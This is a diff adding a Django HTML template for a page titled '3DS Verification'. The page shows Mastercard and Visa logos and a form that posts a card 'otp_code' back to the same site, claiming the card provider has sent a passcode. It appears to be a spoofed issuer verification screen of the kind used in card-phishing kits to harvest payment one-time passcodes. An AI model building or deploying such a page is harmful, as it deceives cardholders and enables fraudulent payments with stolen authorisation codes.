@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Text</title>
+    <link rel="stylesheet" href="/static/assets/custom_css/card_details.css">
+
+</head>
+
+<body>
+
+    <div class="main">
+        <div id="logo-bar">
+            <img id="img" src="/static/assets/imgs/logo.png">
+            <p> - 3DS Verification</p>
+
+        </div>
+        <hr class="h-line">
+
+        <div class="inner">
+            <form action="" method="post">
+                {% csrf_token %}
+                <h2>Your card provider have sent you a one time
+                    passcode, to confirm the payment please
+                    enter the code below:</h2>
+                <h4>One-time Passcode:</h4>
+
+                <input style="border: none; border-radius: 20px; background-color: #D4D4D4;" type="text"
+                    name="otp_code" />
+                <button class="btn" type="submit">Authenticate</button>
+            </form>
+        </div>
+        <div class="cards">
+            <img src="/static/assets/imgs/m_c.png">
+            <img src="/static/assets/imgs/v_c.jpg">
+        </div>
+    </div>
+</body>
+
+</html>
